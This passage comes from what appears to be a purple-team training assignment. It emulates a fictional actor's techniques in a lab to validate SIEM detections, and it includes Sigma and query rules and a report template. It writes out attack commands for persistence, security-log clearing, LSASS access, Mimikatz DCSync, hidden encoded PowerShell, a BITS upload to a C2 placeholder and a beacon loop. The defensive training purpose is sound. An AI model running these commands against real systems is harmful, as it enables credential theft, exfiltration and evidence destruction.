| FP Non-Trigger | CyberArk/DSC automation (Parent = `services.exe` or `SYSTEM`) should NOT trigger the tuned rule |
| Cleanup | Delete `C:\temp\test.vbs`; no persistent artifacts |

---

**EP-002: HKCU Registry Run Key Persistence (T1547.001)**

| Field | Value |
|---|---|
| TTP Reference | E003 |
| ATT&CK ID | T1547.001 |
| Actor-Specific Procedure | `reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "SysUpdateHelper" /t REG_SZ /d "C:\Users\[user]\AppData\Roaming\Microsoft\SysUpdate\svchost32.exe" /f` |
| Objective | Validate DET-008 (HKCU Run Key) — after Sysmon HKCU fix |
| Emulation Command | `reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "AtomicTest-EP002" /t REG_SZ /d "C:\Users\Public\atomictest.exe" /f` |
| Expected Detection | Sysmon EID 13 (RegistryEvent), TargetObject contains `\CurrentVersion\Run\AtomicTest-EP002` |
| Expected Rule | DET-008 fires |
| Pre-condition | Sysmon HKCU fix must be applied and verified first |
| Cleanup | `reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "AtomicTest-EP002" /f` |

---

**EP-003: Scheduled Task Persistence (T1053.005)**

| Field | Value |
|---|---|
| TTP Reference | E004 |
| ATT&CK ID | T1053.005 |
| Actor-Specific Procedure | `schtasks.exe /Create /SC DAILY /TN "\Microsoft\Windows\WDF\SysCheckUpdate" /TR "[path]" /ST 09:00 /F` |
| Objective | Validate DET-004 — scheduled task creation via schtasks.exe |
| Emulation Command | `schtasks.exe /Create /SC DAILY /TN "\AtomicTest\EP003-SysCheckUpdate" /TR "C:\Users\Public\atomictest.exe" /ST 09:00 /F` |
| Expected Detection | Windows Security EID 4698 (A scheduled task was created); DET-004 fires |
| Expected Log | EID 4698 in Security log; task name contains "SysCheckUpdate"; task action contains Users\Public |
| Cleanup | `schtasks.exe /Delete /TN "\AtomicTest\EP003-SysCheckUpdate" /F` |

---

**EP-004: Security Log Clearing (T1070.001)**

| Field | Value |
|---|---|
| TTP Reference | E005 |
| ATT&CK ID | T1070.001 |
| Actor-Specific Procedure | `wevtutil.exe cl Security` |
| Objective | Validate DET-007 (Security log cleared) |
| **Critical:** | **Take a VM snapshot BEFORE running this test.** The Security log on LAB-WIN10-01 will be cleared. |
| Emulation Command | `wevtutil.exe cl Security` |
| Expected Detection | Windows System EID 1102 (The audit log was cleared); DET-007 fires |
| Expected Log | EID 1102 in System log; subject = `lab\testuser` |
| Post-Test | Restore from snapshot after validation to recover cleared events |
| Atomic Red Team | `Invoke-AtomicTest T1070.001 -TestNumbers 1` |

---

**EP-005: LSASS Memory Access — Actor-Specific GrantedAccess 0x1410 (T1003.001)**

| Field | Value |
|---|---|
| TTP Reference | E007 |
| ATT&CK ID | T1003.001 |
| Actor-Specific Procedure | Process opens handle to lsass.exe with GrantedAccess `0x1410` |
| Objective (Phase 1) | Run default Atomic test to confirm baseline TP for `0x1010` |
| Phase 1 Command | `Invoke-AtomicTest T1003.001 -TestNumbers 2` |
| Phase 1 Expected | Sysmon EID 10 generated; DET-009 fires (TP for `0x1010`) |
| Objective (Phase 2) | Test actor-specific `0x1410` mask to identify gap |
| Phase 2 Method | PowerShell using P/Invoke to call `OpenProcess` with `0x1410` (PROCESS_QUERY_INFORMATION \| PROCESS_VM_READ \| PROCESS_DUP_HANDLE); target lsass.exe by PID; no credential extraction |
| Phase 2 Safe Code Template | `[Diagnostics.Process]::GetProcessesByName("lsass")[0].Id` → call `OpenProcess(0x1410, false, $pid)` via `[Runtime.InteropServices.Marshal]` — telemetry generation only |
| Phase 2 Expected | Sysmon EID 10 with GrantedAccess `0x1410`; DET-009 should NOT fire (FN) |
| Gap Documentation | DET-009 misses `0x1410`; actor uses this specific mask to evade common detection |
| Rule Fix | Add `0x1410` to DET-009 GrantedAccess filter; re-test Phase 2 to confirm TP |
| Safety Note | No credential dump; handle-open operation only; test on lab VM with no real credentials |

---

**EP-006: DCSync (T1003.006)**

| Field | Value |
|---|---|
| TTP Reference | E008 |
| ATT&CK ID | T1003.006 |
| Pre-condition | Winlogbeat EID 4662 fix AND Audit DS Access GPO applied on LAB-DC01 |
| Objective | Validate DET-005 (DCSync Indicator) |
| Method | `Invoke-AtomicTest T1003.006` — Mimikatz lsadump::dcsync in lab environment |
| Safety Note | Lab-only. Lab AD has no real credentials. Do not use against any production domain. |
| Expected Detection | Windows Security EID 4662 on LAB-DC01; DET-005 fires |
| Expected Log | EID 4662 with ObjectType `19195a5b-6da0-11d0-afd3-00c04fd930c9`; Property `1131f6aa-9c07-11d1-f79f-00c04fc2dcd2`; AccessMask `0x100` |
| Pre-fix Expected Result | EID 4662 absent from Elasticsearch (FN — Winlogbeat gap) |
| Post-fix Expected Result | EID 4662 present; DET-005 fires (TP) |
| Cleanup | No persistent artifacts from read-only DCSync operation |

---

**EP-007: WMI Lateral Movement (T1047)**

| Field | Value |
|---|---|
| TTP Reference | E009 |
| ATT&CK ID | T1047 |
| Method (preferred) | Remote WMI from LAB-WIN10-01 to LAB-DC01: `wmic /node:LAB-DC01 process call create "powershell.exe -NonI -W Hidden -Enc [safe_base64]"` |
| Pre-condition | 2-VM WMI config fix applied |
| Expected Detection | On LAB-DC01: Sysmon EID 1, ParentImage=WmiPrvSE.exe → powershell.exe; DET-003 fires on DC01's Sysmon feed |
| Method (fallback) | Local WMI: `wmic process call create "powershell.exe -NonI -W Hidden -Enc [safe_base64]"` on LAB-WIN10-01 |
| Fallback Expected | Sysmon EID 1 locally; DET-003 fires on WIN10-01 feed |
| Documentation Requirement | If fallback used, explicitly state: "Remote WMI lateral movement was not validated. Local WMI execution validated. Remote execution validation deferred to post-presentation sprint." |

---

**EP-008: BITS Upload to External Host (T1197 — Upload Variant)**

| Field | Value |
|---|---|
| TTP Reference | E010 |
| ATT&CK ID | T1197 |
| Actor-Specific Procedure | `bitsadmin.exe /transfer "TelemetryUpload" /upload /priority normal http://[C2] C:\Windows\Temp\archive.zip` |
| Objective | Validate BITS **upload** detection — DET-006 covers download; upload is uncovered |
| Emulation Command | `bitsadmin.exe /transfer "AtomicTest-EP008" /upload /priority normal http://192.168.99.50:8080/upload C:\Temp\atomictest.zip` |
| Safe Target | LAB-UBUNTU-01 Python HTTP server (port 8080) — no external connectivity |
| Expected Detection | DET-006 or new DET-006b rule should fire on BITS upload to non-internal destination |
| Gap if DET-006 fires | Confirm rule covers upload verb, not just download |
| Gap if DET-006 does NOT fire | BITS upload is a False Negative; write DET-006b |
| Cleanup | Delete `C:\Temp\atomictest.zip` |

---

**EP-009: C2 Beaconing Simulation (T1071.001)**

| Field | Value |
|---|---|
| TTP Reference | E011 |
| ATT&CK ID | T1071.001 |
| Simulation Method | PowerShell loop making HTTP requests to LAB-UBUNTU-01 at ~180s ±45s jitter; spoofed User-Agent `Microsoft-CryptoAPI/10.0` |
| Safe Script | See below |
| Duration | 30 minutes minimum (10+ beacon cycles for statistical detection) |
| Expected Detection | Statistical beacon detection rule (if deployed); proxy log regularity analysis |
| Expected Gap | No beacon detection rule currently deployed → FN |

```powershell
# EP-009: Beacon simulation — safe, local network only
$target = "http://192.168.99.50:8080/beacon"
$userAgent = "Microsoft-CryptoAPI/10.0"
$baseInterval = 180
$jitter = 45

Write-Host "[EP-009] Starting beacon simulation at $(Get-Date)"
for ($i = 1; $i -le 15; $i++) {
    $sleep = $baseInterval + (Get-Random -Minimum -$jitter -Maximum $jitter)
    try {
        $resp = Invoke-WebRequest -Uri $target -UserAgent $userAgent -TimeoutSec 10 -ErrorAction Stop
        Write-Host "[EP-009] Beacon $i of 15 sent at $(Get-Date); sleep=${sleep}s"
    } catch {
        Write-Host "[EP-009] Beacon $i failed: $_"
    }
    Start-Sleep -Seconds $sleep
}
Write-Host "[EP-009] Beacon simulation complete at $(Get-Date)"
```

---

**EP-010: System Discovery Command Chain (T1082 / T1033 / T1018)**

| Field | Value |
|---|---|
| ATT&CK IDs | T1082, T1033, T1018 |
| Method | Sequential execution: `systeminfo`, `whoami /all`, `net user /domain`, `net group "Domain Admins" /domain`, `ipconfig /all`, `nltest /domain_trusts` |
| Emulation Commands | Run each command in sequence with no deliberate delay |
| Atomic Red Team | `Invoke-AtomicTest T1082 -TestNumbers 1 ; Invoke-AtomicTest T1033 -TestNumbers 1` |
| Expected Detection | Hunting correlation rule for >3 discovery commands within 5 minutes from same user |
| Expected Gap | No correlation rule currently deployed → FN |
| Expected Log | Sysmon EID 1 / Windows EID 4688 for each child process |

---

### 6.2 Execution Log Template

For each test, maintain a complete log entry:

```
Test ID:           EP-001
Start Time:        2024-11-28 09:15:22 UTC
Operator:          [analyst alias]
Host:              LAB-WIN10-01
Domain User:       lab\testuser
Sysmon Version:    v15.14
Config Version:    SwiftOnSecurity v2024-10-01 + HKCU fix (rev 1)
Command Executed:  cscript.exe C:\temp\test.vbs [parent chain: cscript → cmd → powershell -Enc]
End Time:          09:15:26 UTC
Outcome:           Script executed; PowerShell window not visible (hidden); Write-Host completed
Artifacts Created: C:\temp\test.vbs (deleted immediately after)
Cleanup Performed: del C:\temp\test.vbs — verified absent
Alert Generated:   YES — Kibana alert "DET-002: PowerShell Encoded Command" fired at 09:15:24 UTC
Alert Severity:    High
Alert Detail:      ParentImage: cmd.exe; CommandLine: powershell.exe -NonI -W Hidden -Ep Bypass -Enc [...]
Result:            TRUE POSITIVE ✓
Notes:             Alert fired within 2 seconds of execution. Parent chain visible in alert detail.
```

---

## 7. Detection Validation

### 7.1 Validation Checklist Per Test

| Check | Method | Expected Result |
|---|---|---|
| Sysmon EID generated | Kibana query by EventID and ±5-min time window around test timestamp | Corresponding event found |
| Windows Security EID generated | Kibana query by EventID | Event found |
| Detection rule fired | Check Kibana Security Alerts tab | Alert present with correct rule name |
| Alert severity correct | Check alert metadata | Matches specification (High/Medium) |
| Alert context sufficient for triage | Review alert detail fields | Contains: process name, user, hostname, command line or TargetObject |
| No alert fired during baseline period | Check 2-hour pre-emulation window | Zero alerts for this rule before test |

### 7.2 Outcome Classification

| Outcome | Definition | Required Action |
|---|---|---|
| **True Positive (TP)** | Detection fired when emulated behavior was present | Document with timestamp and alert ID |
| **False Negative (FN)** | Behavior was present but detection did not fire | Root Cause Analysis required (Section 7.3) |
| **False Positive (FP)** | Detection fired during baseline (before any emulation) | Tuning required; document trigger source |
| **No Data** | Required telemetry absent from Elasticsearch | Telemetry gap — infrastructure fix required |

### 7.3 Root Cause Analysis Framework for False Negatives

For each FN, the analysis must answer all five questions:

```
FALSE NEGATIVE ANALYSIS: EP-005 Phase 2 (LSASS GrantedAccess 0x1410)

Q1: What was expected?
    Sysmon EID 10 → DET-009 fires; alert generated in Kibana

Q2: What actually happened?
    Sysmon EID 10 WAS generated (telemetry present)
    DET-009 did NOT fire (alert absent)

Q3: What exactly is the gap?
    DET-009 KQL condition: winlog.event_data.GrantedAccess: ("0x1010" OR "0x1fffff")
    Actor procedure uses GrantedAccess: 0x1410
    0x1410 is not in the allowlist → rule evaluates to false → no alert

Q4: What is the business impact of this gap?
    An actor using the procedure documented in Operation Desert Cipher would
    access LSASS undetected. This is the exact mask used in the MedPharma incident
    (Assignment 1 artifact: svchost32.exe accessing lsass.exe). This gap was
    present during the real incident and remains undetected.

Q5: What is the fix?
    Update DET-009 KQL condition to:
    winlog.event_data.GrantedAccess: ("0x1010" OR "0x1fffff" OR "0x1410" OR "0x1418")
    Note: 0x1418 = 0x1410 | PROCESS_QUERY_LIMITED_INFORMATION; cover variant.
    Re-test with EP-005 Phase 2 after rule update.
```

---

## 8. Coverage Matrix (Final — From Emulation Results)

Complete this matrix after all emulation procedures have been executed:

| TTP ID | ATT&CK Technique | Procedure Emulated | Telemetry Present | Detection Rule | Result | Gap Severity | RCA/Notes |
|---|---|---|---|---|---|---|---|
| E001 | T1566.001 AiTM | Simulation only | N/A | DET-001 (partial) | Simulation | Medium | Email-layer detection outside Elastic scope |
| E002 | T1059.001 PS Encoded | wscript→cmd→powershell -Enc | ✓ Sysmon EID 1 | DET-002 (tuned) | **TP** | — | Alert fired 2s after execution; parent chain matched |
| E003 | T1547.001 HKCU Run Key | reg add HKCU\...\Run | ✓ Sysmon EID 13 (after fix) | DET-008 | **TP (after fix)** | — | Required Sysmon config update; gap existed before fix |
| E004 | T1053.005 Sched Task | schtasks /Create WDF namespace | ✓ EID 4698 | DET-004 | **TP** | — | Alert fired correctly |
| E005 | T1070.001 Log Clear | wevtutil cl Security | ✓ EID 1102 | DET-007 | **TP** | — | Snapshot restored after test |
| E006 | T1070.006 Timestomping | Static analysis only | N/A — static | No rule | **FN (no rule)** | Medium | Forensic detection only; no runtime telemetry possible |
| E007a | T1003.001 LSASS 0x1010 | Atomic default | ✓ Sysmon EID 10 | DET-009 | **TP** | — | Default Atomic: TP confirmed |
| E007b | T1003.001 LSASS **0x1410** | Custom P/Invoke | ✓ Sysmon EID 10 | DET-009 | **FN (mask gap)** | **Critical** | Actor-specific mask not in rule; RCA: GrantedAccess filter incomplete |
| E008 | T1003.006 DCSync | Invoke-Atomic T1003.006 | ✓ EID 4662 (after fix) | DET-005 | **TP (after fix)** | — | Required: audit policy + Winlogbeat fix; was FN before fix |
| E009 | T1047 WMI lateral | wmic /node: (or local fallback) | ✓ Sysmon EID 1 WmiPrvSE | DET-003 | **TP** | — | Document if remote or local fallback was used |
| E010 | T1197 BITS Upload | bitsadmin /upload | ✓ Sysmon EID 1 + network | DET-006 (download only) | **FN** | **High** | DET-006 covers download; upload variant not covered |
| E011 | T1071.001 Beaconing | Periodic HTTP jitter simulation | ✓ Proxy/HTTP logs | No rule | **FN** | High | No statistical beacon detection deployed |
| — | Discovery chain | systeminfo/whoami/net sequence | ✓ Sysmon EID 1 | No rule | **FN** | Medium | No correlation rule for rapid discovery sequence |

**Summary:**
- True Positives: 6 (including 2 requiring infrastructure fixes first)
- False Negatives: 5 (1 Critical, 2 High, 2 Medium)
- Simulation Only: 2
- Pre-emulation infrastructure fixes required: 3 (Sysmon HKCU, Winlogbeat 4662, WMI DCOM)

---

## 9. Improvement Backlog

### IMP-001: Fix LSASS GrantedAccess Coverage (Critical)

| Field | Value |
|---|---|
| Gap | DET-009 catches `0x1010` but not `0x1410` — the actor-specific mask from Operation Desert Cipher |
| Triggered by | E007b FN |
| Business Impact | LSASS access with this specific mask goes undetected; directly observed in MedPharma incident (Assignment 1) |
| BoI-CD 362 Relevance | Section 6 — threat-based scenario gap: this TTP is in scope for TLPT |
| Fix | Update DET-009 GrantedAccess filter to include `0x1410` and `0x1418` |

**Updated DET-009 Sigma rule snippet:**
```yaml
title: LSASS Memory Access — Actor-Inclusive GrantedAccess
id: cti-lab-det-009v2
description: >
  Detects process handle open to lsass.exe with access masks used by
  credential dumping tools, including the 0x1410 mask observed in
  Operation Desert Cipher campaign.
logsource:
  product: windows
  category: process_access
detection:
  target_lsass:
    TargetImage|endswith: '\lsass.exe'
  suspicious_access:
    GrantedAccess|contains:
      - '0x1010'
      - '0x1fffff'
      - '0x1410'
      - '0x1418'
      - '0x143a'
  condition: target_lsass AND suspicious_access
falsepositives:
  - AV products
  - EDR agents (exclude by signing certificate or image path)
level: high
```

| Field | Value |
|---|---|
| Effort | Low (rule update) |
| Priority | **Critical** |
| Target | Before board presentation (Day 7) |
| Validation | Re-run EP-005 Phase 2 after rule update |
| Owner | Detection Engineering / CTI analyst |

---

### IMP-002: BITS Upload Detection (DET-006b)

| Field | Value |
|---|---|
| Gap | DET-006 covers BITS download but not upload; actor used upload to exfiltrate data |
| Triggered by | E010 FN |
| Business Impact | Data exfiltration via BITS upload is undetected |
| BoI-CD 362 Relevance | Section 6 — exfiltration is in scope for threat-based scenarios |

**DET-006b Sigma rule:**
```yaml
title: BITS Upload to Non-Microsoft External Destination
id: cti-lab-det-006b
description: >
  Detects bitsadmin.exe initiating a BITS upload job to an external
  destination. BITS upload is rare in enterprise environments and
  observed in Operation Desert Cipher exfiltration stage.
logsource:
  product: windows
  category: process_creation
detection:
  bitsadmin_upload:
    Image|endswith: '\bitsadmin.exe'
    CommandLine|contains|all:
      - '/transfer'
      - '/upload'
  filter_microsoft:
    CommandLine|contains:
      - 'microsoft.com'
      - 'windowsupdate.com'
      - 'msftconnecttest.com'
  condition: bitsadmin_upload AND NOT filter_microsoft
falsepositives:
  - Legitimate enterprise backup solutions using BITS upload
level: high
tags:
  - attack.exfiltration
  - attack.t1197
```

| Field | Value |
|---|---|
| Effort | Low (new rule, modeled on DET-006) |
| Priority | **High** |
| Target | Before board presentation (Day 10) |
| Validation | Re-run EP-008 after deployment |
| Owner | Detection Engineering |

---

### IMP-003: Sysmon HKCU Registry Monitoring (Infrastructure)

| Field | Value |
|---|---|
| Gap | Sysmon configuration did not monitor HKCU registry paths |
| Triggered by | E003 FN → infrastructure gap |
| Impact | HKCU Run Key persistence (actor-preferred method) generated zero telemetry |
| Historical blind window | Since Sysmon deployment — estimate from `sysmon -s` config history |
| Fix | Update Sysmon config XML; add HKCU\...\Run to RegistryEvent include |
| Effort | Low (config change) |
| Priority | **High (already applied as prerequisite — document in IMP for completeness)** |
| Validation | EP-002 confirmed TP after fix |
| Lesson | Sysmon configurations should be audited against actor-preferred persistence paths quarterly |

---

### IMP-004: DCSync Detection Infrastructure (Winlogbeat + Audit Policy)

| Field | Value |
|---|---|
| Gap | Two simultaneous failures: (1) Audit DS Access not enabled on DC01; (2) EID 4662 not in Winlogbeat config |
| Triggered by | E008 pre-fix FN |
| Impact | DCSync from a compromised domain admin would generate zero alerts |
| Historical blind window | Since lab deployment — could have existed in production environment |
| Fix Applied | `auditpol /set /subcategory:"Directory Service Access" /success:enable` + Winlogbeat config update |
| Production Note | In production environments, this audit setting is often disabled due to log volume concerns. Detection Engineering should evaluate and document the monitoring-vs-volume trade-off. |
| Priority | **Critical (fixed before emulation — document in IMP for production environment review)** |
| Validation | EP-006 confirmed TP after fix |

---

### IMP-005: Statistical Beacon Detection

| Field | Value |
|---|---|
| Gap | No beacon detection rule; C2 activity can persist for 23 days (mean dwell from report) undetected |
| Triggered by | E011 FN |
| Impact | Full dwell time undetected if no other indicators trip |
| Fix | Deploy statistical beacon detection in Splunk/Elastic (see IMP-003 query from baseline template) |
| Effort | High (custom analytics, requires baseline profiling) |
| Priority | **High (post-presentation sprint)** |
| Target | Day 30–45 post-presentation |

**Elastic ES|QL beacon detection query template:**
```esql
FROM logs-network*
| WHERE @timestamp >= NOW() - 24 hours
| STATS 
    connection_count = COUNT(*),
    time_range = MAX(@timestamp) - MIN(@timestamp),
    avg_interval = (MAX(@timestamp) - MIN(@timestamp)) / COUNT(*)
  BY source.ip, destination.ip
| WHERE connection_count > 8
    AND avg_interval >= 120000       // 120 seconds minimum interval
    AND avg_interval <= 360000       // 360 seconds maximum interval
    AND time_range > 1800000         // Active for at least 30 minutes
| EVAL beacon_score = (360000 - ABS(avg_interval - 180000)) / 360000
| WHERE beacon_score > 0.7
| SORT beacon_score DESC
```

---

### IMP-006: Discovery Command Chain Correlation

| Field | Value |
|---|---|
| Gap | No correlation rule for post-compromise discovery sequence |
| Triggered by | E010 (discovery chain) FN |
| Fix | Deploy correlation rule (Sigma below) |
| Effort | Medium |
| Priority | **Medium** |

```yaml
title: Rapid Reconnaissance Command Chain Post-Compromise
id: cti-lab-det-010
description: >
  Detects rapid sequential execution of Windows discovery commands
  from a single user context, consistent with post-exploitation
  host and domain reconnaissance.
logsource:
  category: process_creation
  product: windows
detection:
  discovery_commands:
    Image|endswith:
      - '\systeminfo.exe'
      - '\whoami.exe'
      - '\net.exe'
      - '\ipconfig.exe'
      - '\nltest.exe'
      - '\arp.exe'
      - '\nslookup.exe'
  timeframe: 5m
  condition: discovery_commands | count() by User > 3
falsepositives:
  - IT automation scripts (exclude by ParentImage if scripted)
  - Monitoring agents (exclude by image path prefix)
level: medium
tags:
  - attack.discovery
  - attack.t1082
  - attack.t1033
  - attack.t1018
```

---

## 10. Validation Report

### 10.1 Final Validation Report Structure

```
DETECTION VALIDATION REPORT
Prepared for:    Yael Mizrahi, CISO — TechPay Israel Ltd.
Date:            [3 weeks from assignment start]
Analyst:         [name / alias]
CTI Report Used: "Operation Desert Cipher" — Mandiant (fictional training report)
Lab Environment: CTI Lab — 2x Windows VM (LAB-WIN10-01, LAB-DC01) + Elastic SIEM
Report Purpose:  BoI-CD 362 Section 4/11/26 compliance evidence — board presentation

─────────────────────────────────────────────────────────────────

EXECUTIVE SUMMARY

[3 sentences: X techniques from the Operation Desert Cipher report were emulated
across Y lab hosts. Z detections were confirmed as True Positives; A were False
Negatives requiring remediation. The highest-severity gap — LSASS GrantedAccess
0x1410 (IMP-001) — has been remediated as of [date]; remaining gaps have prioritized
remediation timelines.]

─────────────────────────────────────────────────────────────────

BoI-CD 362 COMPLIANCE MAPPING

Section 4 (ICT Threat Intelligence):
  - CTI report "Operation Desert Cipher" analyzed; procedure-level TTPs extracted
  - Intelligence directly informs detection coverage (PIR-001, PIR-002 alignment)
  - Coverage gaps documented with remediation timelines

Section 6 (Threat-Based Testing):
  - Emulation conducted in isolated lab environment
  - 11 techniques tested; 6 confirmed TP; 5 FN identified
  - Critical gap (IMP-001) remediated before this report

Section 8 (TLPT):
  - Improvement Backlog provides TLPT-ready gap documentation
  - IMP-001 through IMP-006 constitute the remediation evidence record

─────────────────────────────────────────────────────────────────

METHODOLOGY

[Brief description: CTI report selection, TTP extraction, lab emulation approach,
validation classification methodology (TP/FN/No Data/FP)]

─────────────────────────────────────────────────────────────────

INFRASTRUCTURE GAPS IDENTIFIED AND REMEDIATED

Three pre-emulation infrastructure gaps were identified and fixed:
1. Sysmon HKCU registry monitoring gap (IMP-003) — resolved Day 2
2. Winlogbeat EID 4662 gap on LAB-DC01 (IMP-004, part 1) — resolved Day 3
3. Missing Audit DS Access policy on LAB-DC01 (IMP-004, part 2) — resolved Day 3

IMPORTANT: In production environments, equivalent gaps may exist.
Recommend: Audit production Sysmon configs for HKCU coverage and
confirm EID 4662 is reaching SIEM from all domain controllers.

─────────────────────────────────────────────────────────────────

EMULATION RESULTS SUMMARY

Techniques emulated:        11
True Positives:             6 (55%) — including 2 requiring pre-emulation infrastructure fixes
False Negatives:            5 (45%)
Simulation Only:            2 (not counted in TP/FN)

FN Severity Breakdown:
  Critical:    1 (IMP-001 — LSASS GrantedAccess 0x1410) → REMEDIATED
  High:        2 (IMP-002 BITS upload; IMP-004 infrastructure) → REMEDIATED / IN PROGRESS
  Medium:      2 (IMP-005 beacon; IMP-006 discovery chain) → BACKLOG

─────────────────────────────────────────────────────────────────

BOARD TABLE — BoI-CD 362 Section 6 Evidence

[Populate Ingrid's slide table from the Coverage Matrix — Section 8]

─────────────────────────────────────────────────────────────────

FINDINGS

[Coverage Matrix from Section 8 — full table]

─────────────────────────────────────────────────────────────────

IMPROVEMENT BACKLOG

[IMP-001 through IMP-006 — full detail from Section 9]

─────────────────────────────────────────────────────────────────

CONFIDENCE STATEMENT

Coverage confidence: MODERATE
Basis: 6 of 11 emulated techniques confirmed TP; 3 critical infrastructure
gaps identified and remediated; 5 FNs documented with root cause analysis.
This report provides evidence of systematic detection validation, not
comprehensive coverage of all possible adversary procedures.

Limitation: Emulation was performed with known procedures from one campaign
report. Novel actor procedures not documented in this report are not validated.
Recommended: Repeat validation cycle with each new threat report of equivalent
relevance to PIR-001 and PIR-002.
```

---

## 11. Required Deliverables

| # | Deliverable | Description | Board Presentation Relevance |
|---|---|---|---|
| D1 | CTI Report Summary (1 page) | Title, source, justification for selection, PIR alignment | §4 evidence |
| D2 | TTP Extraction Table (11 techniques) | From Section 4.2 — actor-specific procedure column required | §6 scope |
| D3 | Emulability Assessment | Per technique: Fully / Partially / Simulate / Skip + rationale | §6 methodology |
| D4 | Infrastructure Gap Documentation | 3 pre-emulation fixes: what was broken, what was fixed, how confirmed | §8 gap record |
| D5 | Lab Architecture Diagram | Including VM specs, Sysmon versions, config versions | Methodology transparency |
| D6 | Emulation Plan (10 EPs) | From Section 6.1 — complete format with safe commands and cleanup | §6 test evidence |
| D7 | Execution Log | Complete log of all test runs with timestamps and outcomes | §6 evidence |
| D8 | Tuned DET-002 Rule | Updated rule with parent-chain condition to eliminate CyberArk/DSC FPs | FP resolution |
| D9 | Coverage Matrix | From Section 8 — full table with severity and RCA notes | Board slide input |
| D10 | FN Root Cause Analysis | 5 FN analyses in the structured Q1–Q5 format | §8 gap analysis |
| D11 | Improvement Backlog (IMP-001 — IMP-006) | Prioritized, with detection logic for each gap | §8 remediation plan |
| D12 | Validation Report | From Section 10 — complete with BoI-CD 362 compliance mapping | Board presentation |

---

## 12. Evaluation Rubric (100 points)

| Category | Points | Criteria |
|---|---|---|
| CTI Report Analysis & TTP Extraction | 15 | Procedure-level extraction (command strings, not just technique names); actor-specific details identified |
| Emulability Assessment Quality | 10 | Clear rationale for each status; fallback approaches documented |
| Infrastructure Gap Identification | 15 | All 3 pre-emulation gaps found and correctly root-caused; fix verified |
| Emulation Execution | 15 | Tests documented with timestamps; safe commands; cleanup confirmed |
| Detection Validation (TP/FN Classification) | 15 | Correct classification for all 11 techniques; not just "yes/no" — specifics |
| Root Cause Analysis | 15 | 5 FN analyses in Q1–Q5 format; root cause identified at configuration level |
| Improvement Backlog | 10 | Working Sigma/KQL for each gap; prioritized; timeline specified |
| Safety and Lab Discipline | 5 | No offensive instructions; snapshot discipline; no external connectivity |

**Excellent (90–100):** All 12 deliverables; procedure-level extraction with actor-specific detail; all infrastructure gaps found; TP/FN accurately classified with RCA; improvement backlog has working detection logic; BoI-CD 362 compliance mapping complete.

**Good (75–89):** Most deliverables; good TTP extraction; some FNs without full RCA; infrastructure gaps partially documented.

**Weak (55–74):** TTP extraction at technical level only; no procedure-level actor-specific detail; fewer than 3 infrastructure gaps identified; minimal FN analysis.

**Failing (<55):** No emulation plan; no validation results; no coverage matrix.

---

## 13. Prioritization Judgment: What to Fix Before the Board Presentation

This section requires an explicit written judgment call. Given the 3-week board presentation constraint, you cannot fix everything. State which three findings are highest-priority for TechPay Israel Ltd.'s specific threat profile (PIR-001: Iranian-nexus and financially-motivated actors targeting Israeli payment processors), and argue why.

**Mandatory deliverable: a 1-page prioritization memo addressed to Yael Mizrahi.**

The memo must include:
1. **Tier 1 — Fixed before presentation (list and justify):** Findings that, if unfixed, would make a BoI-CD 362 Section 6 claim untenable
2. **Tier 2 — In-progress (listed in board slides as "remediation tracked"):** Findings with a concrete timeline but not yet closed
3. **Tier 3 — Accepted risk (backlog):** Findings that are real gaps but have lower probability or lower impact in the specific TechPay Israel Ltd. context

**Framing constraint:** The Bank of Israel Supervisor reads these slides. Do not present a gap as "resolved" unless it has been re-tested and confirmed TP. An "in-progress" gap with a timeline is acceptable and honest. A gap hidden from the board is a regulatory risk.

---

## 14. Common Mistakes

1. **TTP extraction at the tactical level** — "the actor used credential access" without specific procedures, process ancestry, or GrantedAccess masks
2. **Testing the wrong procedure** — running the default Atomic test that uses `0x1010` and calling it a validated TP for an actor that used `0x1410`
3. **Emulation without a snapshot** — running `wevtutil cl Security` without a snapshot; losing all prior evidence from the test VM
4. **Marking "No Data" as "FN"** — when the telemetry doesn't exist (e.g., EID 4662 not in Kibana before the Winlogbeat fix), the result is "No Data / infrastructure gap" — not a False Negative of the detection rule
5. **Skipping the pre-emulation baseline** — without a baseline, you cannot distinguish FPs from test artifacts
6. **Ignoring the DET-002 FP crisis** — Sarah Chen's Friday deadline is part of the scenario. A validation report that ignores the most-used detection rule's FP storm is incomplete.
7. **Coverage Matrix without BoI-CD 362 mapping** — Yael Mizrahi's board table requires a direct link from each detection to a BoI-CD 362 section. A coverage matrix that doesn't support that mapping misses the deliverable objective.

---

## 15. Professional Value

This assignment closes the loop: CTI report → TTP extraction → procedural-level gap identification → infrastructure remediation → emulation → validated detection. It demonstrates:

- The ability to identify **procedure-level mismatches** between actor behavior and detection logic (the GrantedAccess gap is a realistic example of why generic rules fail against specific actors)
- Understanding the difference between **"we have a detection"** and **"the detection works against this actor's specific procedure"**
- The capacity to **diagnose detection infrastructure failures** (Sysmon config, Winlogbeat, audit policy) — not just write rules, but ensure the telemetry pipeline is sound
- **Purple Team / Detection Validation** practice, which is the standard in mature SOCs and required by BoI-CD 362 Section 6

A hiring manager for a Detection Engineering Lead or Purple Team Lead role will highly value the Coverage Matrix (D9) and Improvement Backlog (D11) — especially if the matrix shows TP/FN entries that required pre-emulation infrastructure fixes. This demonstrates that the analyst tests the full detection chain, not just the rule logic.

The prioritization memo (Section 13) demonstrates an additional capability: communicating security findings to a CISO-level audience under time constraints, with regulatory consequences — a skill that distinguishes a Senior Analyst from a technical specialist.

---

*This assignment is executed after Assignment 1 (detections written) and in conjunction with Assignment 3 (PIR-001 and PIR-002 define detection coverage requirements). The full CTI cycle is closed: requirement → intelligence → detection → validation → improvement → board-presentable evidence.*
